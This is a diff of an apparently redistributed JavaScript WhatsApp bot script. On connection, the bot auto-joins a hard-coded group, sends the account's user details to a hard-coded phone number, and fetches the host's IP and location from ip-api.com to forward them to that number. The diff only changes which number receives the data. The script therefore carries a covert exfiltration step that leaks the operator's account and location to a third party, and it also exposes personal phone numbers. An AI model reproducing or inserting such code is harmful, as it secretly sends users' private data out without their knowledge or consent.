@@ -110,11 +110,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/HebsCx7CBxMJBLqyeHemcO`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`917994873071@s.whatsapp.net`, `*Hi Owner Aju, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aju Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917994873071?text=Hello bro"}}})
+ client.sendMessage(`19014016638@s.whatsapp.net`, `*Hi Owner Aju, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aju Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917994873071?text=Hello bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("917994873071@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aju Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917994873071?text=Hello bro"}}})
+       client.sendMessage("19014016638@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aju Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917994873071?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -191,7 +191,7 @@ console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
           "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
       }
       if (anu.action == "add" && mem.includes(client.user.jid)) {
-        client.sendMessage(anu.jid, "Hello everyone, im Ajuser Bot, ready to help you here ㋛︎", "conversation");
+        client.sendMessage(anu.jid, "Hello everyone, im Ajuser Bot, ready to help you here", "conversation");
       }
 hehe = await getBuffer(pp_user)
 if (anu.action == 'add' && !mem.includes(client.user.jid)) {
